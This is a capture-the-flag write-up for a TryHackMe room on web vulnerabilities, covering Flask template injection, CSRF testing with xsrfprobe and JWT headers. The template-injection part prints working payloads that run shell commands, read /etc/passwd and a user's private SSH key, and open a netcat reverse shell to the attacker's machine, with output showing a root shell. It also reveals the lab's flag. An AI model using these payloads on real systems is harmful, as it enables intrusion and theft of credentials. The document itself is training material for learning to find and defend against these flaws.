# TryHackMe: ZTH Obscure Web Vulns (Writeup)

## SSTI

Server side template injection.
Users server side templating engine.
For example, Flask server.

### Manual exploitation

1. How would a hacker(you :) ) cat out /etc/passwd on the server(using cat with the rce payload)

```python
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
```

2. What about reading in the contents of the user test's private ssh key.(use the read file one not the rce one)

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]()('/home/test/.ssh/id_rsa').read()}} 
```

### Automated exploitation

We can use `tplmap` to find SSTI vulns.

1. How would I cat out /etc/passwd using tplmap on the ip:port combo 10.10.10.10:5000, with the vulnerable param "noot".

```shell
tplmap -u http://10.10.10.10.:5000/ -d 'noot' --os-cmd *cat /etc/passwd*
```

### Challenge

After deploying the machine.

#### Test
```python
## Test injection
{{2}}
## Outputs 4
```

#### Exploit

```python
# Find current directory
{{config.__class__.__init__.__globals__['os'].popen('pwd').read()}}
```
```python
# LS current directory
{{config.__class__.__init__.__globals__['os'].popen('ls -ah').read()}}
```
```python
# Get reverse shell (netcat), requires listener on local
{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1 | nc 10.11.8.219 4444 >/tmp/f').read()}}
```
```shell
## On local listener
kali@kali:~/Desktop/repos/ctf/try-hack-me/anonymous$ nc -lvp 4444                           
listening on [any] 4444 ...
10.10.81.67: inverse host lookup failed: Unknown host
connect to [10.11.8.219] from (UNKNOWN) [10.10.81.67] 42936
/bin/sh: 0: can't access tty; job control turned off
# bash
whoami
root
```
```shell
## get the flag
cd /

ls -lah | grep flag
total 2.1G
-rwxrwxrwx   1 root root    8 Apr  6 19:52 flag

cat flag
cooctus
```

## CSRF

### Manual
Can test CSRF forgery by capturing requests, and making forms on other sites that replicate a POST, GET, .etc, request.

### Automated
Can use `xsrfprobe` to test for CSRF vulns. 

```shell
## Generate POC
xsrfprobe HOST --malicious
```

## JWT

Tend to be BASE64 encoded.

JWT headers look like
```json
{"typ":"JWT","alg":"RS256"}
```


